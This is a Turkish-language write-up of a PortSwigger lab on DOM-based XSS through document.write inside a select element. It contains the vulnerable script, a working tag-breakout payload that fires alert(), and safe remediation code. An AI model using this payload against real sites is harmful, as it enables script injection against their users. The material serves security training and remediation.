# DOM XSS in document.write sink using source location.search inside a select element

## Konu Açıklaması (DOM-based XSS: Tag Breakout & document.write)

**DOM-based Cross-Site Scripting (DOM XSS)**, web uygulamasının istemci tarafındaki JavaScript kodunun, güvenilmeyen bir kaynaktan (`window.location` vb.) gelen veriyi yeterli doğrulama veya bağlama duyarlı kodlama yapmadan doğrudan tehlikeli bir alıcı fonksiyona (`document.write()`, `innerHTML` vb.) aktarmasıyla oluşur.

Enjeksiyon noktası bir HTML etiketinin içeriğinde (örneğin bir `<select>` açılır menüsü veya `<option>` etiketleri arasında) yer aldığında, saldırgan önce mevcut etiketi uygun kapanış etiketleriyle kapatarak (**Tag Breakout**) DOM bağlamından çıkar, ardından kendi HTML etiketini veya olay işleyicisini (event handler) enjekte ederek JavaScript yürütülmesini sağlar.

---

## Lab Çözümü

### Lab Bilgileri
- **Lab Adı:** DOM XSS in `document.write` sink using source `location.search` inside a select element
- **Platform:** PortSwigger Web Security Academy
- **Zorluk Seviyesi:** Practitioner (Apprentice temelleri üzerine)
- **Zafiyet Türü:** DOM-based Cross-Site Scripting (DOM XSS)
- **Kaynak (Source):** `location.search` (`storeId` parametresi)
- **Alıcı Fonksiyon (Sink):** `document.write()`
- **Enjeksiyon Bağlamı (Context):** `<select>` HTML etiketi içeriği (Tag Breakout)
- **Hedef:** DOM yapısındaki `<select>` etiketinden çıkarak JavaScript çalıştırmak ve `alert()` fonksiyonunu tetiklemek.

---

### Kaynak Kod ve Taint Flow Analizi

Sayfa kaynağında ve Geliştirici Araçları (DevTools) üzerinde çalışan istemci taraflı betik incelendiğinde:

```javascript
var stores = ["London", "Paris", "Milan"];
var store = (new URLSearchParams(window.location.search)).get('storeId');
document.write('<select name="storeId">');
if (store) {
    document.write('<option selected>'+store+'</option>');
}
for (var i=0; i<stores.length; i++) {
    if (stores[i] === store) {
        continue;
    }
    document.write('<option>'+stores[i]+'</option>');
}
document.write('</select>');
```

- **Source (Kaynak):** `window.location.search` (`storeId` parametresi).
- **Sink (Alıcı):** `document.write()`
- **Bağlam (Context):** `<option selected>` ile `</option>` etiketleri arası (`<select>` bloğu içi).
- **Zafiyet Mekanizması:** `store` değişkeni hiçbir HTML kodlamasından geçirilmeden doğrudan `document.write()` ile sayfa yapısına dize birleştirme (`+`) yöntemiyle yazılmaktadır.

---

### Adım Adım Çözüm Metodolojisi

1. **Fonksiyonun Tespiti:**
   Ürün sayfalarında mağaza stok durumunu kontrol eden açılır menü (`<select name="storeId">`) incelenir.

2. **Parametre Davranışının Doğrulanması:**
   Ürün sayfasının URL sonuna `&storeId=test` eklenerek sayfa yenilendiğinde, menüde en üst seçeneğin dinamik olarak `test` olduğu gözlemlenir:
   ```text
   https://<LAB-ID>.web-security-academy.net/product?productId=1&storeId=test
   ```

3. **Etiket Kapatma ve Kaçış (Tag Breakout):**
   Girdi `<select>` bloğu içinde kaldığından doğrudan `<script>` veya inline event handler çalıştırılamaz; çünkü `<select>` içindeki çoğu etiket sadece metin seçeneği olarak ele alınır.  
   Önce `</select>` ile menü bloğu kapatılır, ardından kod çalıştırabilecek bir görsel elementi enjekte edilir:
   ```html
   &storeId=test</select><img src="1" onerror="alert()">
   ```

4. **İstismar ve Tetikleme:**
   Payload URL parametresine eklenip sayfa çağrıldığında tarayıcı DOM ağacını şu şekilde parse eder:
   ```html
   <select name="storeId"><option selected>test</option></select><img src="1" onerror="alert()"></option>...
   ```
   Görsel kaynağı (`src="1"`) yüklenemeyerek anında `onerror` olayı tetiklenir, `alert()` penceresi açılır ve laboratuvar başarıyla tamamlanır.

---

### Güvenli Kodlama (Remediation)

`document.write()` gibi ham HTML çıktısı üreten yöntemler yerine modern ve güvenli DOM manipülasyon metotları tercih edilmeli; kullanıcıdan gelen girdiler DOM'a mutlaka `textContent` üzerinden aktarılmalıdır:

```javascript
const selectElement = document.createElement('select');
selectElement.name = 'storeId';

const store = (new URLSearchParams(window.location.search)).get('storeId');
if (store) {
    const customOption = document.createElement('option');
    customOption.textContent = store; // Düz metin olarak atanır, HTML parse edilmez
    customOption.selected = true;
    selectElement.appendChild(customOption);
}

for (var i = 0; i < stores.length; i++) {
    if (stores[i] === store) {
        continue;
    }
    const opt = document.createElement('option');
    opt.textContent = stores[i];
    selectElement.appendChild(opt);
}

document.body.appendChild(selectElement);
```
